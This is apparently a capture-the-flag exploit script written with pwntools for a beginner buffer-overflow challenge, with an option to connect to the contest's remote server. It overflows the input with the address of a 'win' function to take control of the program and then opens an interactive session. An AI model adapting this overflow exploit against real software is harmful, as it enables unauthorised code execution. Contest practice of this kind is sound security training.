from pwn import *

sendlineafter = lambda p, x, y: p.sendlineafter(x, y)
sendline = lambda p, x: p.sendline(x)
send = lambda p, x: p.send(x)

filepath = './chall'
e = context.binary = ELF(filepath, checksec=False)
if args.REMOTE:
    p = remote('beginnersbof.quals.beginners.seccon.jp', 9000)
else:
    p = process(filepath)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

sendlineafter(p, b'?', b'1000')
sendlineafter(p, b'?', p64(e.symbols['win'])*10)
p.interactive()
